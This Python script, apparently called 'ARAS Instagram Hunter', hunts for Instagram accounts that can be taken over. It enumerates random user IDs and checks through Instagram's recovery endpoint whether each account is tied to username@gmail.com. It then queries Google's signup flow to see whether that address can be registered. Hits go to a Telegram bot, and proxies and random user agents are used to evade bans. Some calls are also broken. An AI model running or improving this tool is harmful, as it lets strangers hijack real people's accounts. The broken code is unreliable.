import os
import requests
import sys
import time
import datetime
import random
import json
import string
import hashlib
import uuid
import re
from threading import Thread, Lock
from queue import Queue
from user_agent import generate_user_agent
from colorama import Fore, Style, init
from rich.console import Console
from rich.table import Table
from rich.live import Live

# Initialize Colorama and Rich
init(autoreset=True)
console = Console()

# --- Configuration & Constants ---
INSTA_RECOVERY_URL = 'https://i.instagram.com/api/v1/accounts/send_recovery_flow_email/'
GOOGLE_SIGNUP_URL = 'https://accounts.google.com/_/signup/validatepersonaldetails'
INSTA_GRAPHQL_URL = 'https://www.instagram.com/api/graphql'

# Global Stats
stats = {
    "total": 0,
    "hits": 0,
    "bad_insta": 0,
    "bad_email": 0,
    "good_ig": 0,
    "errors": 0
}
stats_lock = Lock()
proxies_list = []

# --- Utility Functions ---
def get_random_proxy():
    if not proxies_list:
        return None
    proxy = random.choice(proxies_list)
    return {"http": f"http://{proxy}", "https": f"http://{proxy}"}

def load_proxies():
    global proxies_list
    if os.path.exists('proxy.txt'):
        with open('proxy.txt', 'r') as f:
            proxies_list = [line.strip() for line in f if line.strip()]
        console.print(f"[bold green][+] Loaded {len(proxies_list)} proxies from proxy.txt[/bold green]")
    else:
        console.print("[bold yellow][!] No proxy.txt found. Running without proxies (Higher risk of ban).[/bold yellow]")

def generate_insta_headers(ua):
    return {
        'User-Agent': ua,
        'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
        'Cookie': 'mid=ZVfGvgABAAGoQqa7AY3mgoYBV1nP; csrftoken=9y3N5kLqzialQA7z96AMiyAKLMBWpqVj'
    }

# --- Core Logic ---

class Hunter:
    def __init__(self, telegram_id, bot_token, bbk, end_id):
        self.telegram_id = telegram_id
        self.bot_token = bot_token
        self.bbk = bbk
        self.end_id = end_id
        self.google_token = None
        self.google_host = None
        self.token_expiry = 0

    def refresh_google_token(self):
        """Fetches a fresh token for Google email availability check."""
        try:
            ua = generate_user_agent()
            headers = {
                'accept': '*/*',
                'accept-language': 'en-US,en;q=0.9',
                'user-agent': ua
            }
            proxy = get_random_proxy()
            res = requests.get('https://accounts.google.com/signin/v2/usernamerecovery', headers=headers, proxy=proxy, timeout=10)
            match = re.search(r'data-initial-setup-data="%.@.null,null,null,null,null,null,null,null,null,&quot;(.*?)&quot;,null,null,null,&quot;(.*?)&', res.text)
            if match:
                tok = match.group(2)
                # Now validate personal details to get the final TL token
                n1 = ''.join(random.choices(string.ascii_lowercase, k=8))
                n2 = ''.join(random.choices(string.ascii_lowercase, k=5))
                host_gaps = ''.join(random.choices(string.ascii_lowercase, k=20))
                
                v_headers = {
                    'authority': 'accounts.google.com',
                    'content-type': 'application/x-www-form-urlencoded;charset=UTF-8',
                    'user-agent': ua,
                    'origin': 'https://accounts.google.com',
                    'referer': 'https://accounts.google.com/signup/v2/createaccount'
                }
                v_data = {
                    'f.req': f'["{tok}","{n1}","{n2}","{n1}","{n2}",0,0,null,null,"web-glif-signup",0,null,1,[],1]',
                    'deviceinfo': '[null,null,null,null,null,"US",null,null,null,"GlifWebSignIn",null,[],null,null,null,null,2,null,0,1,"",null,null,2,2]'
                }
                v_res = requests.post(GOOGLE_SIGNUP_URL, headers=v_headers, data=v_data, cookies={'__Host-GAPS': host_gaps}, proxy=proxy, timeout=10)
                
                if '",null,"' in v_res.text:
                    self.google_token = v_res.text.split('",null,"')[1].split('"')[0]
                    self.google_host = v_res.cookies.get_dict().get('__Host-GAPS', host_gaps)
                    self.token_expiry = time.time() + 300 # Valid for 5 mins
                    return True
        except:
            pass
        return False

    def check_gmail(self, username):
        """Checks if a Gmail address is available for registration."""
        if not self.google_token or time.time() > self.token_expiry:
            if not self.refresh_google_token():
                return False
        
        try:
            ua = generate_user_agent()
            email = username
            headers = {
                'authority': 'accounts.google.com',
                'content-type': 'application/x-www-form-urlencoded;charset=UTF-8',
                'user-agent': ua,
                'referer': f'https://accounts.google.com/signup/v2/createusername?TL={self.google_token}'
            }
            data = f"continue=https%3A%2F%2Fmail.google.com&ddm=0&flowEntry=SignUp&service=mail&f.req=%5B%22TL%3A{self.google_token}%22%2C%22{email}%22%2C0%2C0%2C1%2Cnull%2C0%2C5167%5D&flowName=GlifWebSignIn"
            
            proxy = get_random_proxy()
            res = requests.post('https://accounts.google.com/_/signup/usernameavailability', 
                                headers=headers, data=data, cookies={'__Host-GAPS': self.google_host}, 
                                params={'TL': self.google_token}, proxy=proxy, timeout=10)
            
            if '"gf.uar",1' in res.text:
                return True
        except:
            pass
        return False

    def send_telegram(self, msg):
        try:
            url = f"https://api.telegram.org/bot{self.bot_token}/sendMessage"
            requests.post(url, data={"chat_id": self.telegram_id, "text": msg}, timeout=10)
        except:
            pass

    def process_hit(self, username, info):
        with stats_lock:
            stats["hits"] += 1
        
        full_name = info.get('full_name', 'N/A')
        pk = info.get('pk', 'N/A')
        followers = info.get('follower_count', 0)
        following = info.get('following_count', 0)
        posts = info.get('media_count', 0)
        
        msg = f"""
🔥 NEW HIT FOUND! 🔥
━━━━━━━━━━━━━━━━━━
👤 Name: {full_name}
🆔 ID: {pk}
📧 User: @{username}
📊 Followers: {followers}
📉 Following: {following}
📝 Posts: {posts}
📧 Email: {username}@gmail.com (AVAILABLE)
━━━━━━━━━━━━━━━━━━
Decoded & Improved by ARAS
"""
        self.send_telegram(msg)
        with open('hits.txt', 'a') as f:
            f.write(msg + "\n")

    def worker(self):
        while True:
            try:
                target_id = random.randint(self.bbk, self.end_id)
                ua = generate_user_agent()
                proxy = get_random_proxy()
                
                # 1. Get Username from ID via GraphQL
                lsd = ''.join(random.choices(string.ascii_letters + string.digits, k=32))
                data = {
                    'lsd': lsd,
                    'variables': json.dumps({'id': target_id, 'render_surface': 'PROFILE'}),
                    'doc_id': '25618261841150840'
                }
                headers = {'X-FB-LSD': lsd, 'User-Agent': ua}
                
                response = requests.post(INSTA_GRAPHQL_URL, headers=headers, data=data, proxy=proxy, timeout=10)
                res_json = response.json()
                user_data = res_json.get('data', {}).get('user')
                
                if not user_data:
                    with stats_lock: stats["bad_insta"] += 1
                    continue
                
                username = user_data.get('username')
                with stats_lock: stats["good_ig"] += 1
                
                # 2. Check if linked to an email on Instagram
                check_data = {
                    'signed_body': '0d067c2f86cac2c17d655631c9cec2402012fb0a329bcafb3b1f4c0bb56b1f1f.' + json.dumps({
                        '_csrftoken': '9y3N5kLqzialQA7z96AMiyAKLMBWpqVj',
                        'adid': str(uuid.uuid4()),
                        'guid': str(uuid.uuid4()),
                        'device_id': f'android-{hashlib.md5(str(uuid.uuid4()).encode()).hexdigest()[:16]}',
                        'query': f"{username}@gmail.com"
                    }),
                    'ig_sig_key_version': '4'
                }
                
                check_res = requests.post(INSTA_RECOVERY_URL, headers=generate_insta_headers(ua), data=check_data, proxy=proxy, timeout=10)
                
                if f"{username}@gmail.com" in check_res.text:
                    # 3. Check if Gmail is actually available
                    if self.check_gmail(username):
                        self.process_hit(username, user_data)
                    else:
                        with stats_lock: stats["bad_email"] += 1
                else:
                    with stats_lock: stats["bad_email"] += 1
                
                with stats_lock: stats["total"] += 1
                
            except Exception:
                with stats_lock: stats["errors"] += 1
                time.sleep(1)

# --- UI & Execution ---

def update_table():
    table = Table(title="ARAS Instagram Hunter - Live Stats", show_header=True, header_style="bold magenta")
    table.add_column("Category", style="cyan")
    table.add_column("Count", justify="right", style="green")
    
    with stats_lock:
        table.add_row("Total Scanned", str(stats["total"]))
        table.add_row("Valid IG Accounts", str(stats["good_ig"]))
        table.add_row("Email Hits (Available)", str(stats["hits"]))
        table.add_row("Bad Emails", str(stats["bad_email"]))
        table.add_row("Errors/Bans", str(stats["errors"]))
    
    return table

def main():
    os.system('clear')
    console.print(render('ARAS', colors=['blue', 'green'], align='center'))
    console.print("[bold cyan]━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━[/bold cyan]")
    
    load_proxies()
    
    try:
        tg_id = int(console.input("[bold green]Enter Telegram ID: [/bold green]"))
        tg_token = console.input("[bold green]Enter Bot Token: [/bold green]")
    except:
        console.print("[bold red]Invalid Input![/bold red]")
        return

    console.print("\n[bold yellow]Select Year Range:[/bold yellow]")
    console.print("1: 2011 | 2: 2012 | 3: 2013 | 4: 2014 | 5: 2015 | 0: All (2011-2023)")
    choice = console.input("[bold blue]-> Choice: [/bold blue]")
    
    ranges = {
        '1': (10000, 17699999),
        '2': (17699999, 263014407),
        '3': (263014407, 361365133),
        '4': (361365133, 1629010000),
        '5': (1629010000, 2500000000),
        '0': (10000, 21254029834)
    }
    
    bbk, end_id = ranges.get(choice, (10000, 21254029834))
    
    hunter = Hunter(tg_id, tg_token, bbk, end_id)
    
    # Start Threads
    thread_count = 15 if not proxies_list else 40
    for _ in range(thread_count):
        Thread(target=hunter.worker, daemon=True).start()
    
    # Live UI
    with Live(update_table(), refresh_per_second=1) as live:
        while True:
            time.sleep(1)
            live.update(update_table())

if __name__ == "__main__":
    main()
